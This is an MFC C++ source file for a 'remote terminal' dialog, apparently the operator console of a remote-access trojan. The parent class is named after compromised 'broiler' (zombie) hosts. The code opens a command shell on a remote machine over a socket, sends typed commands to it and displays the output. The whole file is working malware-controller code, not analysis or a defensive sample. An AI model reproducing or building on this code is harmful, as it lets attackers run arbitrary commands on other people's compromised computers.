// CmdShell.cpp : 实现文件
//

#include "stdafx.h"
#include "Client.h"
#include "CmdShell.h"
#include "BroilerData.h"

static UINT idArray[] = {ID_RES_CMD1,     //状态栏
                         ID_RES_CMD2};
// CCmdShell 对话框

IMPLEMENT_DYNAMIC(CCmdShell, CDialog)

CCmdShell::CCmdShell(CWnd* pParent /*=NULL*/, SOCKET l_socket, CString strTitle)
	: CDialog(CCmdShell::IDD, pParent)
{
	m_socket = l_socket;
	m_bReadOnly = true;
	m_strShowMsg = _T("");
	m_strTitle = strTitle;
}

CCmdShell::~CCmdShell()
{
	if (NULL != m_pfont)
	{
		delete m_pfont;
	}
}

void CCmdShell::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT_CMD_RECV, m_cmdRecvCtrl);
	DDX_Control(pDX, IDC_EDIT_CMD_SEND, m_cmdSendCtrl);
}


BEGIN_MESSAGE_MAP(CCmdShell, CDialog)
	ON_BN_CLICKED(IDC_BTN_CMD_SEND, &CCmdShell::OnBnClickedBtnCmdSend)
	ON_WM_CTLCOLOR()
END_MESSAGE_MAP()


// CCmdShell 消息处理程序
BOOL CCmdShell::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO:  在此添加额外的初始化
    DlgInit();
	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}

void CCmdShell::DlgInit()
{
	m_Brush.CreateSolidBrush(RGB(0,0,0));  //黑色的画刷
	m_pfont = new CFont; 
	m_pfont->CreateFont(14, // nHeight 
		0, // nWidth 
		0, // nEscapement 
		0, // nOrientation 
		FW_NORMAL, // nWeight 
		FALSE, // bItalic 
		FALSE, // bUnderline 
		0, // cStrikeOut 
		ANSI_CHARSET, // nCharSet 
		OUT_DEFAULT_PRECIS, // nOutPrecision 
		CLIP_DEFAULT_PRECIS, // nClipPrecision 
		DEFAULT_QUALITY, // nQuality 
		DEFAULT_PITCH | FF_SWISS, // nPitchAndFamily 
		_T("Arial")); // lpszFac   //Arial
	GetDlgItem(IDC_EDIT_CMD_RECV)->SetFont(m_pfont);

	//设置对话框的标题
	CString strTitle = _T("远程终端  \\\\");
	strTitle += m_strTitle;
	SetWindowText(strTitle);

	//设置对话框的图标
	HICON m_hIcon;
	m_hIcon = AfxGetApp()->LoadIcon(IDI_ICON_CMD);//IDR_ICON为图标资源名
	SetIcon(m_hIcon, FALSE); // Set small icon

	//状态栏
	m_cmdStatusBar.Create(this);
	m_cmdStatusBar.SetIndicators(idArray, sizeof(idArray) / sizeof(UINT));
	m_cmdStatusBar.SetPaneInfo(0, idArray[0], SBPS_NORMAL, 200);
	m_cmdStatusBar.SetPaneInfo(1, idArray[1], SBPS_NORMAL, 200);
	m_cmdStatusBar.SetPaneText(0 , _T("就绪"));
	m_cmdStatusBar.SetPaneText(1 , _T(""));
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0);  //显示工具栏和状态栏（这句话一定要加上, 否则工具栏不显示）

    MSGINFO tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO));
	tagMsgInfo.nMsgCmd = CMD_TELNET;
	bool bSuccess = true;
	m_moduleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);
}

HBRUSH CCmdShell::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
	HBRUSH hbr = CDialog::OnCtlColor(pDC, pWnd, nCtlColor);

	// TODO:  在此更改 DC 的任何属性
    if (IDC_EDIT_CMD_RECV == pWnd->GetDlgCtrlID() && CTLCOLOR_EDIT == nCtlColor)
	{
		pDC->SetTextColor(RGB(255,252,0));  //字体颜色
		pDC->SetBkColor(RGB(0,0,0));  //设置文本背景色
		pDC->SetBkMode(TRANSPARENT);  //设置背景透明
		hbr = (HBRUSH)m_Brush;
	}
	// TODO:  如果默认的不是所需画笔，则返回另一个画笔
	return hbr;
}

BOOL CCmdShell::PreTranslateMessage(MSG* pMsg)
{
	// TODO: 在此添加专用代码和/或调用基类
	if (WM_KEYDOWN == pMsg->message)
	{
		int nVirtKey = (int)pMsg->wParam;
		if (VK_RETURN == nVirtKey)  //回车键
		{
			//发送消息
			if (m_cmdSendCtrl.GetSafeHwnd() == ::GetFocus())  //当前焦点是不是在发送文本控件上
			{
				SendCommond();
			}
			return TRUE;
		}
		else if (VK_ESCAPE == nVirtKey || VK_RETURN == nVirtKey)  //ESC按键
		{
			return TRUE;
		}
	}
	return CDialog::PreTranslateMessage(pMsg);
}

void CCmdShell::OnBnClickedBtnCmdSend()
{
	// TODO: 在此添加控件通知处理程序代码
	SendCommond();
}

void CCmdShell::SendCommond()
{
	int nLength = m_cmdSendCtrl.GetWindowTextLength();  //获取长度
	if (0 == nLength)
	{
		return ;
	}
	CString strCMDline = _T("");
	GetDlgItemText(IDC_EDIT_CMD_SEND, strCMDline);  //命令
	MSGINFO tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO));
	COMMOND_C tagCMD;
	memset(&tagCMD, 0, sizeof(COMMOND_C));
	tagCMD.flag = 0;
	CStringToChar(strCMDline, tagCMD.command);
	if (0 == strcmp(tagCMD.command, "exit"))  //如果是输入了exit命令，则退出了
	{
		SendMessageW(WM_CLOSE, 0, 0); //窗口退出
		return ;
	}
	tagMsgInfo.nMsgCmd = CMD_COMMOND;
	strcat_s((char*)tagCMD.command, sizeof(tagCMD.command), "\r\n");   //输入了ipconfig \r\n 回车换行
	memcpy((char*)tagMsgInfo.context, (char*)&tagCMD, sizeof(COMMOND_C));
	bool bSuccess = true;
	m_moduleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);

	CString strInfo = _T("");
	if (bSuccess)  //发送成功
	{
		strInfo = _T("CMD命令发送成功!");
	}
	else
	{
		strInfo = _T("CMD命令发送失败!");
	}
	TCHAR* pText = strInfo.GetBuffer(strInfo.GetLength());
	::SendMessage(this->m_cmdStatusBar, SB_SETTEXT, (WPARAM)0, (LPARAM)pText);
	strInfo.ReleaseBuffer();
	GetDlgItem(IDC_EDIT_CMD_SEND)->SetWindowText(_T(""));
}

void CCmdShell::SetReturnInfo(IN COMMOND_C tagCmdInfo)
{
	if (0 == tagCmdInfo.flag)
	{
		CString strRet = _T("");
		strRet = CharToCString(tagCmdInfo.command);
		m_strShowMsg += strRet;
		m_cmdRecvCtrl.SetWindowText(m_strShowMsg);
		m_cmdRecvCtrl.SetSel(-1);
		m_cmdSendCtrl.GetFocus();
	}
}

//CString转char
void CCmdShell::CStringToChar(IN CString str, OUT char* w)
{
	int len = WideCharToMultiByte(CP_ACP,0,str,str.GetLength(),NULL,0,NULL,NULL);
	WideCharToMultiByte(CP_ACP,0,str,str.GetLength(),w,len,NULL,NULL);
	w[len] = '\0';
}

//char 转换成 CString
CString CCmdShell::CharToCString(char* result)
{
	//将char 转换为 CString字符
	DWORD dwNum = MultiByteToWideChar(CP_ACP, 0, result, -1, NULL, 0);
	wchar_t *pwText;
	pwText = new wchar_t[dwNum];
	if (!pwText)
	{
		delete []pwText;
		return NULL;
	}
	MultiByteToWideChar (CP_ACP, 0, result, -1, pwText, dwNum);// 开始转换
	CString cstr = pwText;
	delete pwText;
	return cstr;
}

void CCmdShell::PostNcDestroy()
{
	// TODO: 在此添加专用代码和/或调用基类
	((CBroilerData*)this->m_pParentWnd)->m_pCmdShellDlg = NULL;
	delete this;
}

void CCmdShell::OnCancel()
{
	// TODO: 在此添加专用代码和/或调用基类
	MSGINFO tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO));
	tagMsgInfo.nMsgCmd = CMD_COMMOND;

	COMMOND_C tagCmdInfo;
	memset(&tagCmdInfo, 0, sizeof(COMMOND_C));
	tagCmdInfo.flag = 0;

	char cQuitMsg[] = "exit\r\n";
	strcpy_s((char*)tagCmdInfo.command, sizeof(cQuitMsg), (char*)cQuitMsg);
	memcpy((char*)tagMsgInfo.context, (char*)&tagCmdInfo, sizeof(COMMOND_C));
	bool bSuccess = true;
	m_moduleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);

	((CBroilerData*)this->m_pParentWnd)->m_pCmdShellDlg = NULL;
	DestroyWindow();
	delete this;
}
